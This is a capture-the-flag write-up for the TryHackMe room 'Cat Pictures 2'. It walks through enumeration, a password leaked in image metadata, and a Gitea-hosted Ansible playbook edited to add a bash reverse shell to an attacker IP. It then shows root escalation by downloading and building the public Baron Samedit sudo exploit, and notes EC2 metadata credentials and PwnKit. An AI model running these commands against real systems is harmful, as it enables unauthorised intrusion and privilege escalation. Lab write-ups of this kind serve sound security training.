# TryHackMe: Cat Pictures 2 Writeup

**Room Link:** [Cat Pictures 2](https://tryhackme.com/room/catpictures2)

---

## Initial Enumeration

```bash
nmap $IP
```

**Results:**
```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
222/tcp  open  rsh-spx
3000/tcp open  ppp
8080/tcp open  http-proxy
```

Port 3000 is running Gitea. Browsing to `/explore/users` reveals a user named `samarium`.

## Image Metadata Leak

The Lychee gallery on the target has a hint on its first image to check the metadata. Downloading it and running `exiftool`:

```bash
exiftool Downloads/f5054e97620f168c7b5088c85ab1d6e4.jpg
```

The `Title` field contains a path:

```text
Title : :8080/764efa883dda1e11db47671c4a3bbd9e.txt
```

Visiting that path reveals a note:

```text
note to self:

I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
This file isn't easy to find anyway unless you have the correct url...

gitea: port 3000
user: samarium
password: TUmhyZ37CLZrhP

ansible runner (olivetin): port 1337
```

## Gitea Access and Ansible Pivot

Logging into Gitea with `samarium:TUmhyZ37CLZrhP`, the first flag is found under a commit titled "add flag" in a repository containing an Ansible playbook.

The playbook runs as `remote_user: bismuth` against the target host, so modifying it and pushing gives command execution as `bismuth` once the automation picks up the change:

```bash
git clone http://samarium:TUmhyZ37CLZrhP@10.146.189.221:3000/samarium/ansible.git
cd ansible
```

Edit `playbook.yaml` to add a reverse shell task:

```yaml
- name: Test
  hosts: all
  remote_user: bismuth
  tasks:
    - name: get the username running the deploy
      command: whoami
      register: username_on_the_host
      changed_when: false

    - debug: var=username_on_the_host

    - name: pwn
      shell: "bash -c 'bash -i >& /dev/tcp/192.168.138.49/4444 0>&1'"
```

```bash
git add playbook.yaml
git commit -m "update task"
git push origin main
```

Start a listener and trigger the run through the **OliveTin** web UI on port 1337 (the "ansible runner" mentioned in the note):

```bash
nc -lnvp 4444
```

Visiting `http://$IP:1337` and running the deployment action fires the playbook, giving a reverse shell as `bismuth`. The next flag is in this user's home directory.

`bismuth`'s RSA private key is also present under `~/.ssh`.

## Privilege Escalation: bismuth -> root

Running `linpeas.sh` as `bismuth` shows the box is running `sudo 1.8.21p2`, a version affected by **CVE-2021-3156** ("Baron Samedit"), a sudo heap-based buffer overflow that grants root without needing any sudo permissions configured.

On the attacking machine:

```bash
git clone https://github.com/blasty/CVE-2021-3156
tar czf cve.tar.gz CVE-2021-3156
python3 -m http.server 8000
```

On the target:

```bash
wget http://192.168.138.49:8000/cve.tar.gz
tar xzf cve.tar.gz
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich
```

This drops a root shell, from which the final flag can be read.

## Other Notes

Enumeration on this box also turned up EC2 instance metadata (`http://169.254.169.254`) exposing temporary IAM credentials for a role literally named `vulnerable-machine`, along with a `pkexec` binary vulnerable to **PwnKit (CVE-2021-4034)**. Either could serve as an alternate escalation/pivot path worth exploring further, though the sudo exploit above was the fastest route to root in this run.
